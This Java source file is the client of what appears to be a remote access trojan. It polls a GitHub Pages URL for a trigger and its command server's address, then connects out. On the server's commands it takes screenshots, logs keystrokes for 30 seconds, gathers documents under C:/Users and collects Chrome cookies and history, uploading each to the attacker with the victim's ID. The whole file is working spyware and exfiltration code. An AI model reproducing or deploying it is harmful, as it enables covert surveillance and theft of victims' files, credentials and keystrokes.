package client;

import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import utils.FileData;
import utils.KeyboardFilesFilter;

import java.awt.*;
import java.io.*;
import java.net.*;
import java.util.*;
import java.util.List;
import java.util.concurrent.BrokenBarrierException;
import java.util.concurrent.CyclicBarrier;

public class Client
{
    private UUID uniqueId;
    private Socket requestSocket;
    private ObjectOutputStream out;
    private ObjectInputStream in;
    private String[] address;
    FileData fileData;

    public Client(UUID uniqueId)
    {
        this.uniqueId = uniqueId;
    }

    private boolean  initConnection()
    {
        try
        {
            int port = Integer.parseInt(address[2]);
            requestSocket = new Socket(address[1], port);

            out = new ObjectOutputStream(requestSocket.getOutputStream());
            out.flush();
            in = new ObjectInputStream(requestSocket.getInputStream());

            sendMessage(uniqueId + ";1");
            return true;
        }
        catch (IOException e)
        {
            return false;
        }
    }

    private void closeConnection()
    {
        try {
            in.close();
            out.close();
            requestSocket.close();
        }
        catch(IOException ioException){
            ioException.printStackTrace();
        }
    }

    private boolean checkForTrigger()
    {
        try
        {
            String URL = "http://drorventura.github.io/templates/mp/addr.html";
            URL url = new URL(URL);
            Document doc = Jsoup.parse(url, 1000 * 3);
            String text = doc.body().text();

            address = text.split(";");

            if (address[0].equals("1"))
            {
                return true;
            }
        }
        catch (IOException e) {
            return false;
        }
        return false;
    }

    private void handleMessage(String message)
    {
    	try
        {
            //close connection
            if (message.charAt(0) == '1')
            {
                sendMessage(uniqueId + "is closing connection");
                closeConnection();
            }

            //print screen
            if (message.charAt(1) == '1')
            {
                PrintScreen printScreen = new PrintScreen();
                File image = printScreen.printScreen();

                sendMessage(uniqueId + ";is sending a screenshot");
                sendFile(image, "ScreenShots");

                image.setWritable(true);
                image.delete();
            }

            //listen to keyboard for 30 sec
            CyclicBarrier barrier = null;
            if (message.charAt(2) == '1')
            {
            	barrier = new CyclicBarrier(2);
            	ListenToKeyboard listenToKeyboard = new ListenToKeyboard(barrier);
            	Thread keyboardListener = new Thread(listenToKeyboard);
                keyboardListener.run();
            }

            //find all pdf/word/excel/txt files
            if (message.charAt(3) == '1')
            {
                ArrayList<File> filesFound = new ArrayList<>();
                String usersDirectoryPath = "C:/Users/";
                File usersDirectory = new File(usersDirectoryPath);

                FindDocuments findDocuments = new FindDocuments();
                findDocuments.getDocuments(usersDirectory, filesFound);

                sendMessage(uniqueId + ";is sending documents");
                sendFiles(filesFound, "Documents");
            }

            //find cookies and history
            if (message.charAt(4) == '1')
            {
                FindCookiesHistory cookiesHistory = new FindCookiesHistory();
                Collection<File> files = cookiesHistory.getCookies();
                sendMessage(uniqueId + ";is sending cookies");
                sendFiles(files, "Chrome");
            }

            if(message.charAt(2) == '1')
            {
                System.out.println("waiting...");
                barrier.await();

                sendMessage(uniqueId + ";is sending keyboard clicks");
                Collection<File> files = prepareFilesToSend();
                sendFiles(files, "KeyboardInput");

                for (File file : files)
                {
                    file.setWritable(true);
                    file.delete();
                }

                System.out.println("done waiting...");
            }

            sendMessage(uniqueId + ";done");
        }
    	catch(IOException | AWTException | InterruptedException | BrokenBarrierException e)
        {
    		e.printStackTrace();
    	}
    }

    private Collection<File> prepareFilesToSend()
    {
        String directoryPath = System.getProperty("user.dir");
        File directory = new File(directoryPath);

        File[] files = directory.listFiles(new KeyboardFilesFilter());
        List<File> filesFound = Arrays.asList(files);

        return filesFound;
    }

    private FileData createFileData(File file, String directory)
    {
        FileInputStream fileInputStream = null;
        DataInputStream dataInputStream = null;
        fileData = new FileData();

        String filename = file.getName();
        fileData.setFilename(filename);
        fileData.setSourceDirectory(file.getParent());
        String destinationDirectory = uniqueId + "/" + directory + "/";
        fileData.setDestinationDirectory(destinationDirectory);

        try
        {
            fileInputStream = new FileInputStream(file);
            dataInputStream = new DataInputStream(fileInputStream);

            int length = (int) file.length();
            byte[] fileBytes = new byte[length];

            int totalBytesRead = 0;
            int read;

            while (totalBytesRead < length &&
                  (read = dataInputStream.read(fileBytes,totalBytesRead,length - totalBytesRead)) >= 0)
            {
                totalBytesRead += read;
            }

            fileData.setFileSize(length);
            fileData.setFileData(fileBytes);
            fileData.setStatus(FileData.Status.SUCCESS);
        }
        catch (IOException e)
        {
            e.printStackTrace();
            fileData.setStatus(FileData.Status.ERROR);
        }
        finally
        {
            try
            {
                if(fileInputStream != null)
                    fileInputStream.close();
                if (dataInputStream != null)
                    dataInputStream.close();
            }
            catch (IOException e)
            {
                e.printStackTrace();
            }
        }

        return fileData;
    }

    private void sendFile(File file, String directory)
    {
        createFileData(file, directory);

        try
        {
            out.writeObject(fileData);
            out.flush();
        }
        catch (IOException e)
        {
            e.printStackTrace();
        }
        fileData = null;
        System.gc();
    }

    private void sendFiles(Collection<File> files, String directory)
    {
        System.gc();

        for (File file : files)
        {
            sendFile(file, directory);
        }
    }

    private void sendMessage(String msg)
    {
        try{
            out.writeObject(msg);
            out.flush();
        }
        catch(IOException ioException)
        {
            ioException.printStackTrace();
        }
    }

    public void run()
    {
        while(!checkForTrigger())
        {
            try {
                Thread.sleep(10000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }

        if(!initConnection())
            return;

        while(!requestSocket.isClosed())
        {
            try
            {
                String message = (String) in.readObject();
                handleMessage(message);
            }
            catch(ClassNotFoundException classNot){
                sendMessage(uniqueId + ";data received in unknown format");
            }
            catch (IOException e)
            {
                closeConnection();
                break;
            }
        }
    }
}
